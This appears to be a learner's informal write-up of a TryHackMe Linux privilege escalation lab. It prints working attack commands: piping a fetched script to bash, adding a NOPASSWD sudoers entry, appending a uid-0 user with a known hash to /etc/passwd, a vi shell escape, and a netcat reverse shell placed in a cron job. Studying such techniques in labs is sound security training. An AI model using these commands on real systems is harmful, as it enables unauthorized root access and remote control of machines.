# Common Linux Priviledge Escalation.

```
export IP=10.10.139.93
```

### [Task1] What is it?

- Simple put, linux privesc is going from lower priviledged user in a linux system to a high priviledged user by leveraging misconfigs and other stupid oversights in the system or the systems apps.
There are alot of things that could be achieved by escalating priviledeges, in ctfs you the flag yuyuyu :). In real world scenarios, you get fucked if your system gets pwned(hacker slang for privesc).


### [Task 2] Direction of Priviledge Escalation.

![](https://github.com/Joe-Degs/TryHackMe/Common_Linux_Privesc)
 
- Two main types of of priviledge escalation:
1. **Horizontal priviledge Escalation:** this basically means taking over other user accounts on the victim system. (traveling sideways on the tree)
2. **Vertical priviledge Escalation:** this means taking over the admin or root account on the server. (traveling upwards on the three)


### [Task 3] Enumeration.

- its time to do my little `python3 http.server 4444` then `curl http://<my_ip>:4444/LinEnum.sh | bash`.


### [Task 4] Abusing SUID/GUID Files
- There was suid binary in there. Ran it and got root. Then changed my user too a root user with nopasswd priveledge
```
find / -perm -u=s -type f 2>/dev/null   //find file with setuid permision.

user3   ALL=(ALL:ALL) NOPASSWD:ALL  //added this to get root user priviledge
```


### [Task 5] Exploiting Writable /etc/passwd
- from the previous challenge we saw that we could write to the /etc/passwd file. Now we can just add a new user to the file. If you know how to do that correctly. 
An example is:
```
test:x:0:0:root:/root:/bin/bash

// structure is

username:password:user-id:group-id:userid-info:home-directory:command/shell
```
- username shd be btn 1 to 32 characters.
- password shd be hashed appropriately and stored in /etc/shadow file. You will use the `passwd` compute to do that.
- user id and group id, each user must be assigned a unique id, 0 is for root, 1-99 for predefined users, 100-999 for system and administrative users. For groups, those motherfuckers can have any range of number they want LOL!, it shd be stored in the /etc/group file alongside thoo.
- command/shell is supposed to be the absolute command of the user, doesnt have to be a shell thoo, can be any command the motherfucker likes

```
//creating a password hash with salt "new" and password "123"
openssl passwd -1 -salt new 123

hash => $1$new$p7ptkEKU1HnaHpRtzNizS1

//now lets create a new root user with username "new".
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

//now we add it like so

echo "new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash" >> /etc/passwd    //this didnt work

i opened nano, copied and pasted it and it worked.
```


### [Task 6] Escaping Vi Editor
- My favorite one :). Just open [GTFOBins](https://gtfobins.github.io) and start hacking like a motherfucker.

- this user can run vi as root with nopasswd priviledge.. we use this to get root!
```
vi -c ":/bin/sh" /dev/null
```

### [Task 7]Exploiting Crontab
- first thing i do is run `crontab -l` if it doesnt give anything?.. i proceed to `cat /etc/passwd`.
```
"mkfifo /tmp/odpwmm; nc 10.8.29.246 8888 0</tmp/odpwmm | /bin/sh >/tmp/odpwmm 2>&1; rm /tmp/odpwmm"
```
- just the normal old reverse shell exploit i have been using.
- Also i need to give serious attention to the metasploit thingy

### [Task 8] Exploiting PATH variable.
- We are going to use suid binaries that call commands in paths we have manipulated to do what we have manipulated them to do as root.
-Errm we done with that.

### [Task 9] Expanding my Knowledge
- We have done great work here. Now its over to us to learn more and get better at this stuff actually,.

- some links to great resources i have to read up on real soon
1. [](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)

2. [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

3. [](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)

4. [](https://payatu.com/guide-linux-privilege-escalation)